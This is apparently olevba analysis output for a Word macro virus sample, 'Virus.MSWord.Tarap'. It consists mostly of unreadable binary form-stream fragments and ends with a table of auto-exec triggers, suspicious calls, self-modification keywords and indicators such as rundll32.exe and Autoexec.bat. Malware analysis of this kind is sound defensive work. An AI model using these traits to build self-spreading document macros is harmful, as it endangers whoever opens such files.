- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������XY�Նv������Ͻ��rK��w(I#�^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʞ�o|�� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j~#���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��kn�Nb���*k`m��#�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߷j�U?iO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��ß��[_[i�Wk���O�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�xm�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<N�?�|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�[��]�,!��k2dn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X�϶|3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�/��M�<B&H.��$�5�*c`�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	R8+(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�7��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�M����kYR�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����A�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Gψ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ױx��&��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��<A�h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k$�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���z����xWE�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ށ%�O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.!;��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YT��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rj�vo�Z�[��,:SY
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�w�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���b3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�|c�>��/���n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��I#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�V�a�L�Ϳn�.�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}7X�d�W�/V��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I3�As
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�/���?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|I��΋y{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l{���7�>�������I��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�#v�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>#|f�U���k�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
< 5+iJiw�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�@������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rޭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=~9E��kzc���7����9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�O˚���	��N����u�F�7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\P�5�{p��Г�	P��){�S�c�z��4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[[���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g@��7��H,��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S]���?�|>�_���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e����j1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\b;��[k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	4_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ޫ�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iS���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�%��K,r�*��s���I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׃| ���/��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z��Q��N�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ZR�n�h�O��e�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`���܍'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3����}�����G�~:״
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�]����K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҙ� A�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ٙ�I��@?Fx�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���x��mt�e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d>`�4RxD2�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<V���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-o�f��[��:�du�>X�MjZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�6%�G
�v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��i��c=���O�D�jK��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�1�k�[��v��+�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"i4ص�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t}N�i����D�$�EF�N�X��Q��ۉ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�k;?��7������ִ;=u��y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�m.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͌T+y@d`���z�W�|K�Ư�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�⻼�&V��zv�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5��pk_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>0�?�o�/|=�A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k���$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x'�����X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���pxn;�ŷ�[�:�o?k�x}U�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bkw�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �U*�F�P�d���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�iڏ����h���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%{{�v�D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z@�y�Y3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bs��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�sߵ�ǆ�-��~#��<A�[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=J���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�#�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&O]â������4���m��佽�hK
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�#O3q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ǧ�A�7��v�P�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�o�^k�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�a��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'ĝg�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xv�]�d�E��͕���4���3�"S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N��媏G�jo
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ii�_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�mJ8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R9�/"���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�'s�ޛ��㇃��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;-n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<��$K(��(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʒ7�?<|8��_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�C�.�o'��M,�iz�J�Um�n|��6���<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m�U��<x�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
�`h�Rm���1&O��x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I���>�/4��o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^��ۥ̮|�7*�㐀X`nے
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"The Dark" Creador de Tarapoto Virus 2000
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial Narrow
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |Image1_MouseMove    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wtv.dll             |Executable file name                         |
|IOC       |rundll32.exe        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |autoexe.bat         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

